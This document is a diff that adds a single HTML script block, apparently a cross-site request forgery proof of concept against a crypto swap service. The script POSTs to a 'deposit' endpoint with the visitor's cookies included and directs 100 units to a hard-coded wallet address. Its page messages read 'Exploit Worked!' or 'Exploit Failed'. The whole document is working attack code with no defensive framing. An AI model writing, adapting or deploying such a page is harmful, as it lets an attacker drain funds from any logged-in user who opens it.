@@ -1,0 +1,20 @@
+<script>
+fetch("https://swap.pump.fun/deposit", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ amount: 100, to: "HXSPRDbxoLpsFHEg4xWetcqDRQFK2pPW1f4tkfMsJAAR" }),
+})
+.then(res => {
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  return res.json();
+})
+.then(data => {
+  console.log("SUCCESS:", data);
+  document.body.innerHTML = `<h1>Exploit Worked!</h1><pre>${JSON.stringify(data, null, 2)}</pre>`;
+})
+.catch(err => {
+  console.error("FAILED:", err);
+  document.body.innerHTML = `<h1>Exploit Failed</h1><p>${err.message}</p>`;
+});
+</script>
